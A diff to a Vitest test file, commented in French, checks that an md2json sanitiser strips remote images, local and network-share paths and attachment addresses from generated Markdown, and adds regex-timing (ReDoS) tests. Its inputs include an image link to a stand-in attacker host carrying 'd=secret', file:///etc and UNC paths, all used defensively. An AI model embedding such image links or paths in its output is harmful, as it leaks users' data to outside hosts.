@@ -3,7 +3,7 @@ import { describe, expect, it, test } from "vitest";
 
 import {
   EMPTY_DOC,
-  isLocalImageSrc,
+  isGeneratedImageSrc,
   isValidContent,
   json2md,
   type JSONContent,
@@ -1030,6 +1030,51 @@ describe("schema mirror", () => {
 
 // Issue 642 : une image distante dans un contenu généré n'émet aucune requête.
 describe("md2json stripRemoteImages", () => {
+  // QA 0.8.0-1 (issue 678) : une image que le parseur laisse en texte brut
+  // (adresse file: refusée, balise HTML) ne reste ni en Markdown ni en HTML.
+  it("keeps only the alt text of images left as raw text", () => {
+    const text = (md: string) =>
+      JSON.stringify(md2json(md, { stripRemoteImages: true }));
+    expect(text("Avant ![le logo](file:///etc/x.png) après")).toContain(
+      '"text":"Avant le logo après"',
+    );
+    expect(text('Texte <img src="file:///x" alt="photo"> fin')).toContain(
+      '"text":"Texte photo fin"',
+    );
+    const bare = text("<img src='https://exemple.org/b.png'>");
+    expect(bare).not.toContain("img");
+    expect(bare).not.toContain("exemple.org");
+    // Dans du code, rien n'est touché.
+    expect(text("`![x](file:///y)`")).toContain("![x](file:///y)");
+    expect(text('```\n<img src="a">\n```')).toContain("<img src=");
+    // Sans retrait des images (notes de l'utilisateur), rien ne change.
+    expect(JSON.stringify(md2json("![x](file:///y)"))).toContain(
+      "![x](file:///y)",
+    );
+  });
+
+  // CodeQL js/polynomial-redos (alerte 109) : 50 000 répétitions de chaque
+  // motif, de quoi rendre visible un coût quadratique (≈ 2,5 s chacun avec les
+  // anciennes expressions, sur le seul nettoyage).
+  it.each([
+    ["![\\", "![\\".repeat(50_000)],
+    ["![](", "![](".repeat(50_000)],
+    ["<img", "<img".repeat(50_000)],
+  ])("nettoie en temps linéaire 50 000 répétitions de « %s »", (_, md) => {
+    const started = performance.now();
+    md2json(md, { stripRemoteImages: true });
+    expect(performance.now() - started).toBeLessThan(750);
+  });
+
+  it("garde le texte alternatif d'une image brute avec une adresse longue", () => {
+    const text = JSON.stringify(
+      md2json(`Avant ![photo](file:///${"a".repeat(1500)}.png) après`, {
+        stripRemoteImages: true,
+      }),
+    );
+    expect(text).toContain('"text":"Avant photo après"');
+  });
+
   it("retire une image distante de bloc et garde son texte alternatif", () => {
     const json = md2json(
       "Intro\n\n![logo](https://attaquant.example/p.png?d=secret)\n\nFin",
@@ -1057,35 +1102,72 @@ describe("md2json stripRemoteImages", () => {
     expect(text).not.toContain('"image"');
   });
 
-  it("garde les images locales et le contenu sans option", () => {
-    const local = md2json(
-      "![a](asset://localhost/tmp/a.png)\n\n![b](http://asset.localhost/tmp/b.png)\n\n![c](data:image/png;base64,AAAA)",
-      { stripRemoteImages: true },
-    );
-    expect(local.content?.filter((node) => node.type === "image")).toHaveLength(
-      3,
+  it("garde data:image et le contenu sans option", () => {
+    const kept = md2json("![c](data:image/png;base64,AAAA)", {
+      stripRemoteImages: true,
+    });
+    expect(kept.content?.filter((node) => node.type === "image")).toHaveLength(
+      1,
     );
 
     const untouched = md2json("![logo](https://example.com/p.png)");
     expect(JSON.stringify(untouched)).toContain("https://example.com/p.png");
   });
+
+  // Issue 677 : aucun fichier local ni chemin réseau dans un contenu généré.
+  it("retire les images de fichiers locaux et de chemins réseau", () => {
+    const json = md2json(
+      [
+        "![a](asset://localhost/tmp/a.png)",
+        "![b](http://asset.localhost/%5C%5C192.0.2.1%5Cshare%5Cb.png)",
+        "![c](file:///etc/c.png)",
+        "![d](/home/user/d.png)",
+        "![e](//192.0.2.1/share/e.png)",
+      ].join("\n\n"),
+      { stripRemoteImages: true },
+    );
+    const text = JSON.stringify(json);
+    expect(text).not.toContain('"image"');
+    // `file:` n'est pas un lien pour le parseur : la ligne reste du texte.
+    for (const leak of ["asset", "192.0.2.1", "/home/user"]) {
+      expect(text).not.toContain(leak);
+    }
+    expect(text).toContain('"text":"a"');
+  });
+
+  it("ne garde une pièce jointe que par identifiant, sans adresse", () => {
+    const id = "0b9f2c1e-4d3a-4b5c-8d7e-1f2a3b4c5d6e";
+    const json = md2json(
+      `[rapport.pdf](attachment://${id})\n\n[secret.pdf](asset://localhost/C:/Users/x/secret.pdf)`,
+      { stripRemoteImages: true },
+    );
+    const attachments = (json.content ?? []).filter(
+      (node) => node.type === "fileAttachment",
+    );
+    expect(attachments).toHaveLength(1);
+    expect(attachments[0].attrs?.attachmentId).toBe(id);
+    expect(attachments[0].attrs?.src).toBeUndefined();
+    const text = JSON.stringify(json);
+    expect(text).not.toContain("asset://");
+    expect(text).toContain('"text":"secret.pdf"');
+  });
 });
 
-describe("isLocalImageSrc", () => {
+describe("isGeneratedImageSrc", () => {
   it.each([
-    ["asset://localhost/a.png", true],
-    ["http://asset.localhost/a.png", true],
     ["data:image/png;base64,AAAA", true],
-    ["blob:http://localhost/1", true],
-    ["/assets/syntheo-icon.png", true],
+    ["DATA:image/gif;base64,R0lG", true],
+    ["asset://localhost/a.png", false],
+    ["http://asset.localhost/a.png", false],
+    ["blob:http://localhost/1", false],
+    ["/assets/syntheo-icon.png", false],
+    ["file:///tmp/a.png", false],
+    ["\\\\server\\share\\a.png", false],
     ["https://example.com/a.png", false],
-    ["http://example.com/a.png", false],
-    ["//example.com/a.png", false],
     ["data:text/html,<b>x</b>", false],
-    ["javascript:alert(1)", false],
     ["", false],
     [undefined, false],
   ])("%s → %s", (src, expected) => {
-    expect(isLocalImageSrc(src)).toBe(expected);
+    expect(isGeneratedImageSrc(src)).toBe(expected);
   });
 });
